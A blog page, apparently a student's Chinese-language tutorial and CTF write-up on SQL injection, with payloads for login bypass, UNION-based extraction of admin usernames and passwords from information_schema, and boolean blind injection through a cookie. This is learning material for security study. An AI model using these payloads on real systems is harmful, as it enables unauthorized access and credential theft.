@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>sql注入笔记 | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">书阁(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+                
+                    <span class="post-tag">
+                        <a href="/tags/%E9%BB%91%E5%AE%A2/">
+                            黑客
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/hackbar/">
+                            hackbar
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                            sql注入
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/mysql/">
+                            mysql
+                        </a>
+                    </span>    
+                
+                    <span class="post-tag">
+                        <a href="/tags/cookie/">
+                            cookie
+                        </a>
+                    </span>    
+                           
+            
+        </div>
+        <div class="post-title">
+            
+            
+                sql注入笔记
+            
+            
+        </div>
+        <span class="post-date">
+            3月 30, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <p><em>首先，sql注入可以通过url(应该都知道吧)链接、表单输入等途径实现，可以使用hackbar、burp等工具（sql语句不区分大小写）</em></p>
+<h1 id="sql语法"><a href="#sql语法" class="headerlink" title="sql语法"></a>sql语法</h1><p><strong>例如：现在有一个保存在数据库中的用户名密码表</strong></p>
+<p>叫allusers</p>
+<p><strong>选取表格里面的所有内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM allusers</span><br></pre></td></tr></table></figure>
+
+<p><strong>在上面的基础上，选取指定的用户名、密码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最简单的sql注入：</strong></p>
+<p>将上面的语句改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27;’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可见多加了一个  ‘  此条语句报错，黑客通过错误代码，可以得知sql注点</p>
+<p>若将语句改为这样，– 这个符号后面的被解释为注释，不执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释</strong>不被执行，则可以直接通过用户名而不需要密码登陆账户，但是前提是得知道正确的用户名</p>
+<p>若不知道正确的用户名，该怎么办？</p>
+<p>由于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此语句用 AND 连接，有个判断AND前后真假值的流程</p>
+<p>若是用OR连接两个条件，并且确保有一个条件永真，则整条语句被判断为真</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; OR 1=1 -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>sql里合并两个表格内容：</strong></p>
+<p>用UNION 连接俩个SELECT语句，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT * FROM table2</span><br></pre></td></tr></table></figure>
+
+<p>在mysql中，<strong>UNION SELECT</strong> 后面可以不加指定表格名字，直接加 NULL</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT NULL,NULL</span><br></pre></td></tr></table></figure>
+
+<p>后面加一个NULL,若是没有报错，则表明table1这个表格是一列，</p>
+<p>后面加俩个NULL,若是没有报错，则表明table1这个表格是俩列，</p>
+<p>因此，黑客可以一直用NULL测试，知道没有报错，从而得知table1 是个几列表格</p>
+<p>假如我现在使用下面语句进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT **NULL,NULL**，NULL FROM allusers</span><br></pre></td></tr></table></figure>
+
+<p>意思是将allusers和table1进行合并（具体怎么并目前还没搞清楚）</p>
+<p>但是，如果如果allusers的各个数据类型和table1不一致，则无法完成合并（UNION合并必须保证数据类型和列数一致，例如：数字和字符不是一个数据类型）</p>
+<p>因此，还要对数据类型进行测试，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT ‘1’ , NULL , NULL		报错</span><br><span class="line"></span><br><span class="line">SELECT * FROM table1 UNION SELECT NULL , ’2‘,  NULL		报错</span><br><span class="line"></span><br><span class="line">SELECT * FROM table1 UNION SELECT NULL,NULL,&#x27;3&#x27;		通过</span><br></pre></td></tr></table></figure>
+
+<p>则可以得知，第三列为数字</p>
+<p>注入：</p>
+<p>在可注入的地方，加入 ’ 中止数据内容，并加入注释关键词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 WHERE name=&#x27;admin&#x27; --&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这时候，在中间注入<strong>UNION</strong>语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 WHERE name=&#x27;admin&#x27;  UNION SELECT NULL,username，password FROM allusers --&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>一般不加保护的数据库的网站，就会将合并新内容后的表展示在页面上，这时就可以知道账户密码了</p>
+<h3 id="要是有保护？该怎么办？"><a href="#要是有保护？该怎么办？" class="headerlink" title="要是有保护？该怎么办？"></a>要是有保护？该怎么办？</h3><h3 id="利用cookie！"><a href="#利用cookie！" class="headerlink" title="利用cookie！"></a>利用cookie！</h3><p>cookie保存在数据库中</p>
+<p>cookie向服务器发展出请求，数据库利用相关语句查找cookie：</p>
+<p>cookie请求数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:cookieid=astljs</span><br></pre></td></tr></table></figure>
+
+<p>随后数据库查找存储的cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此时，可以修改cookie的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>若页面未改变，则表示可以注入</p>
+<p>如果我们故意让逻辑判错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND 1=0  --‘</span><br></pre></td></tr></table></figure>
+
+<p>此时页面出错，可以得知查询出错时页面状态</p>
+<p>此时便可以不断进行调试，根据页面状态判断调试结果的对错</p>
+<p>利用SUBSTRING语句进行判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(&#x27;password&#x27;,1,1) =&#x27;m&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>此语句的意思是：判断password字符串的第一个字符是否为m</p>
+<p>黑客可以将SUBSTRING里的第一个参数修改为一个查询语句，接下来就是不断发送请求，修改判断字符，爆破出密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;m&#x27; --‘</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;z&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>这就是所谓的<strong>布尔注入</strong>，是一种<strong>盲注</strong>（<em>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程为盲注</em>）</p>
+<p>当网站不返回页面时该怎么办呢？</p>
+<p>例如：向mysql注入LOAD_FILE()函数，给其提供域名，会触发DNS查询，如果在域名中动手脚，比如插入管理员密码查询语句，并且返回给黑客自己的服务器里，则可以间接得到管理员密码。</p>
+<h1 id="针对上面的教学，遇到实战问题："><a href="#针对上面的教学，遇到实战问题：" class="headerlink" title="针对上面的教学，遇到实战问题："></a>针对上面的教学，遇到实战问题：</h1><h2 id="1，在查表有几列时，不知道表的名字怎么办？"><a href="#1，在查表有几列时，不知道表的名字怎么办？" class="headerlink" title="1，在查表有几列时，不知道表的名字怎么办？"></a>1，在查表有几列时，不知道表的名字怎么办？</h2><p>注意：由于sql注入可以通过url链接进行，下面实例利可用hackbar进行，所写的sql语句是直接加在相关url链接后面的，例如：</p>
+<p><img src="https://i.328888.xyz/2023/03/30/iCQiro.png"></p>
+<p>直接用order by </p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 2</span><br></pre></td></tr></table></figure>
+
+<p>后面的数字可以自己更改来测试，此语句：按照查询结果的第三个列进行排序，实际用处就是判断相应的表的列存在与否，用1、2、3……依次试验，直到找到未响应的一个</p>
+<h2 id="2，如何判断显位点？"><a href="#2，如何判断显位点？" class="headerlink" title="2，如何判断显位点？"></a>2，如何判断显位点？</h2><p>当我们找到注入点后，想找到注入后哪里会回显我的需要的信息</p>
+<p>举个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2 union select 1,2</span><br></pre></td></tr></table></figure>
+
+<p>具体来说，”id&#x3D;-1”是一个无效的条件，它被用来绕过原始查询语句中的WHERE子句。”union select 1,2”是一个新的SELECT语句，它将查询的结果与原始查询的结果进行联合。在这种情况下，新查询语句返回的结果是两个值1和2。</p>
+<p>（<em>下面的”id“是测试网址中的参数，由于其目的是制造无效条件，在其他不含id这个参数的网站中，只需要同样制造无效条件即可，下同</em>）</p>
+<h2 id="3，如何获取数据库名称？"><a href="#3，如何获取数据库名称？" class="headerlink" title="3，如何获取数据库名称？"></a>3，如何获取数据库名称？</h2><p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()</span><br></pre></td></tr></table></figure>
+
+<p>“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。</p>
+<p>“union”用于将两个或多个SELECT查询结果合并成一个结果集。</p>
+<p>“select 1”表示第一个查询结果为1。</p>
+<p>“database()”表示查询当前数据库的名称。在这个查询中，它返回的是当前数据库的名称，通常是用于确定数据库的名称，以便后续攻击。</p>
+<h2 id="4，得到数据库名字后，如何获取数据表的信息？"><a href="#4，得到数据库名字后，如何获取数据表的信息？" class="headerlink" title="4，得到数据库名字后，如何获取数据表的信息？"></a>4，得到数据库名字后，如何获取数据表的信息？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>“news”是实例中的数据库名称</p>
+<p>“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。</p>
+<p>“union”用于将两个或多个SELECT查询结果合并成一个结果集。</p>
+<p>“select 1”表示第一个查询结果为1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(select group_concat(table_name) from information_schema.tables where </span><br></pre></td></tr></table></figure>
+
+<p>table_schema&#x3D;’news’)”是一个子查询，它返回包含指定数据库中所有表名称的逗号分隔字符串。在这个查询中，它返回的是当前数据库中所有表名称的逗号分隔字符串。</p>
+<p>此步可得知数据表信息，例如数据表名字，得到数据表名字后，可进一步读取数据表中的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;news&#x27; and table_name=&#x27;admin&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>“admin”、”contents”是此实例中的表的名称</p>
+<p>实例中得到字段名称id、usernames、password（<em>未放示意图</em>）</p>
+<p>获取usernames的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(username) from admin)</span><br></pre></td></tr></table></figure>
+
+<p>获取password信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(password) from admin)</span><br></pre></td></tr></table></figure>
+
+<p>得到密码！</p>
+<p><em>本实例地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> 里的basic板块下的BBUU SQL COURSE 1 1题目</em></p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/04/02/c++_experiment/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/03/05/data_structure_algorithm/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
